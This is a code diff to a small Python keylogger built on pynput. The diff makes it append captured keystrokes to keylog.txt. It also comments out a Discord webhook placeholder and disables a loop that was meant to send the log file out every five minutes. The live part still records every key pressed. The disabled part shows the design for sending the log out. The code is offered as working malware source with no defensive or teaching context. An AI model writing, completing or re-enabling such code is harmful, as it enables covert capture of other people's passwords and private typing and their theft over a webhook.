@@ -1,10 +1,10 @@
 from pynput import keyboard
-import requests
-import time
+#import requests
+#import time
 import os
 #import random
 
-webhook = "the discord web hook will be here"
+#webhook = "the discord web hook will be here"
 #rdm_sec = [500,600,700,800,900]
 
 # This function runs every time a key is pressed
@@ -18,7 +18,7 @@ def on_press(key):
 
 
     # Save to file
-    with open("keylog.txt", "w") as file:
+    with open("keylog.txt", "a") as file:
         file.write(log)
 
 
@@ -26,7 +26,7 @@ def on_press(key):
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
 
-
+'''''''''
 
 #send content of file function
 def send_file():
@@ -51,3 +51,6 @@ def send_file():
 while True:
     send_file()
     time.sleep(300) # 300 sec. 5 minutes
+    
+'''''''''''
+
